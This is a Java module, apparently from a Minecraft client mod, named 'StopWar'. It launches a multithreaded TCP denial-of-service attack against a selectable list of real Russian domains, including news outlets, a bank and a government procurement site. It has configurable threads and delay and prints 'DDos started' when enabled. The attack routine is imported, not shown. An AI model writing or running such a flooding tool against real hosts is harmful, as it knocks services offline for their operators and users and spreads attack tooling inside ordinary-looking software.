package me.offeex.bloomware.client.module.modules.extension;

import me.offeex.bloomware.api.ukraine.interfaces.TCPDDos;
import me.offeex.bloomware.client.command.CommandManager;
import me.offeex.bloomware.client.module.Module;
import me.offeex.bloomware.client.setting.settings.SettingEnum;
import me.offeex.bloomware.client.setting.settings.SettingNumber;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@Module.Register(name = "StopWar", description = "Takes down Russian propaganda sites", category = Module.Category.EXTENSION)
public class StopWar extends Module {
    public final SettingNumber delay = new SettingNumber.Builder("DelayMs").value(100).min(10).max(3000).inc(10).setup(this);
    public final SettingNumber threads = new SettingNumber.Builder("Threads").value(10).min(1).max(100).inc(1).setup(this);
    public final SettingNumber timeOut = new SettingNumber.Builder("TimeOut").value(30).min(5).max(60).inc(1).setup(this);
    public final SettingEnum selected = new SettingEnum.Builder("Site").modes("lenta.ru","ria.ru","ria.ru","rbc.ru","www.rt.com","kremlin.ru","smotrim.ru","tass.ru","tvzvezda.ru","vsoloviev.ru","1tv.ru","vesti.ru","sberbank.ru","zakupki.gov.ru", "russian.rt.com").setup(this);

    private ScheduledExecutorService threadPool;

    @Override
    public void onEnable() {
        CommandManager.addChatMessage("DDos started");
        threadPool = Executors.newScheduledThreadPool((int) threads.getValue());
        for (int i = 0; i < threads.getValue(); i++) {
            threadPool.scheduleWithFixedDelay(new TCPDDos(), 1, (long) timeOut.getValue(), TimeUnit.SECONDS);
        }
    }

    @Override
    public void onDisable() {
        if(threadPool != null) threadPool.shutdownNow();
        threadPool = null;
        CommandManager.addChatMessage("DDos stopped");
    }
}
